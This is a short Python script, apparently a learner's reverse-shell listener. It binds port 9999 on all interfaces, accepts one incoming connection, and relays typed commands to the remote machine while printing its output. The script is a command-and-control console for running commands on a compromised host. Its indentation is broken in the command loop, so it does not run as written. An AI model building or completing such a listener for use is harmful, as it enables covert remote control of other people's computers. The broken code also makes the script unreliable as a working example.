
import cmd
import  socket
import  sys




# a create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as message:
        print("Socket connection error: " + str(message))


        #binding the port host
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as message:
        print("Socket binding error: " + str(message) + "\n" + "Retrying...")
        bind_socket()

# accepting the connection
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()

 # sending commands
def send_commands(conn):
    while True:
    cmd = input()
    if cmd == 'quit':
        conn.close()
        s.close()
        sys.exit()
    if len(str.encode(cmd)) > 0:
        conn.send(str.encode(cmd))
        # receiving data
        client_response = str(conn.recv(1024), "utf-8")
         print(client_response, end="")

         #defining main function
def main():
    create_socket()
    bind_socket()
    socket_accept()


main()













    


